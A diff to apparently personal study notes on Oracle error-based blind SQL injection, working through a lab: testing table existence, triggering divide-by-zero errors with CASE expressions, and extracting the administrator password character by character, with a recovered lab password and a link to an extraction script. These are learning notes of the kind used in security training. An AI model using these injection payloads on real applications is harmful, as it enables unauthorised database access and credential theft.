@@ -194,6 +194,7 @@ xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
     - With the first, the ```CASE```  expression evaluates to 'a', which does not cause any error.
     - With the secound input, it evaluates to ```1/0```, which causes a divide-by-zero error.
 - Conditions is
+
 ```bash
 ' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
 if admin exists -> condition 1=1 evaluted -> 1/0 evaluted -> Error
@@ -219,13 +220,25 @@ Analysis:
 ' || (select '' from dualfiewjfow) || ' -> error 500
 
 2) Confirm that the users table exists in the database
+' || (select '' from users) || '  -> 500
+-> user table exists but the column name empty entries, which might break the concatination.
 
 ' || (select '' from users where rownum =1) || '  -> 200
--> users table exists
+-> users table exists and it return one row entry it must avaliable in the table got 200 response.
+
+3.1) As you get HTTP 200 code in both true case and false case, we have to find another way of injecting a SQL query which causes a different behavior in the false case.
+'|| (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+According to the SQL query order of execution, above query will execute as follows:
+- Determine the data `FROM dual table`
+- Validate the condition `CASE WHEN(1=1)` Since 1=1 is always true,
+- `TO_CHAR(1/0)` evaluated causing Error 500
+
+
 
 3) Confirm that the administrator user exists in the users table  -> 200
 ' || (select '' from users where username='administrator') || ' -> 200
-' || (select '' from users where username='Unknown') || ' -> 200, We can't decide whether particular user available or not
+' || (select '' from users where username='Unknown') || ' -> 200, 
+We can't decide whether particular user available or not
 
 ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
 
@@ -246,8 +259,7 @@ Analysis:
 ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
 -> w is not the first character of the password
 
-wjuc497wl6szhbtf0cbf
-
-
+Some thing like this password  wjuc497wl6szhbtf0cbf
+script here - https://github.com/ashok5141/Application-Security-Cheatsheet/blob/main/Scripts/SQL_Oracle_Blind_Password_Retrive.py 
 script.py <url>
 ```
